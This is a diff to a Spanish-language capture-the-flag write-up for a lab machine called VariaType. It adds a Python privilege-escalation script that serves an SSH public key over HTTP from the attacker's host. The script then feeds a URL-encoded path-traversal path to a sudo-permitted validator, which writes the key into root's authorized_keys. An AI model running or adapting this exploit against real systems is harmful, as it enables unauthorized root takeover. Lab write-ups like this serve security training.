@@ -71,7 +71,7 @@ Ruta descubierta:
 
 - `/files` (retorna 301, indica listing)
 
-![Portal VariaType descubierto](/images/writeups/variatype/portal-vhost.png)
+![Variable Font Generator en variatype.htb/tools/variable-font-generator](/images/writeups/variatype/portal-vhost.png)
 
 ## Explotación de Git expuesto
 
@@ -295,6 +295,58 @@ Este comando genera un par de claves SSH para la escalada.
 
 ```bash
 ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
+```
+
+El script `privesc.py` automatiza la escalada: genera el par de claves SSH, levanta un servidor HTTP simple para servir la clave pública, y luego ejecuta el comando sudo para escribir la clave en el authorized_keys de root.
+
+```python
+#!/usr/bin/env python3
+import subprocess
+import threading
+import http.server
+import os
+
+KEY_PATH = "/tmp/id_rsa"
+
+subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", KEY_PATH, "-N", ""], check=True)
+
+with open(f"{KEY_PATH}.pub", "r") as f:
+    pubkey = f.read().strip()
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/id_rsa.pub":
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(pubkey.encode())
+        elif "%2froot%2f.ssh%2fauthorized_keys" in self.path:
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(pubkey.encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+server = http.server.HTTPServer(("0.0.0.0", 8000), Handler)
+thread = threading.Thread(target=server.serve_forever)
+thread.daemon = True
+thread.start()
+
+print("[+] Servidor HTTP iniciado, esperando...")
+import time
+time.sleep(2)
+
+subprocess.run([
+    "sudo", "/usr/bin/python3", "/opt/font-tools/install_validator.py",
+    "http://10.10.14.191:8000/%2froot%2f.ssh%2fauthorized_keys"
+], check=True)
+
+print("[+] Clave escrita en authorized_keys de root")
+print("[+] Conectando como root...")
+
+subprocess.run(["ssh", "-i", KEY_PATH, "-o", "StrictHostKeyChecking=no", f"root@{os.getenv('TARGET_IP', '10.129.35.155')}"])
 ```
 
 Este comando sirve la clave pública vía HTTP.
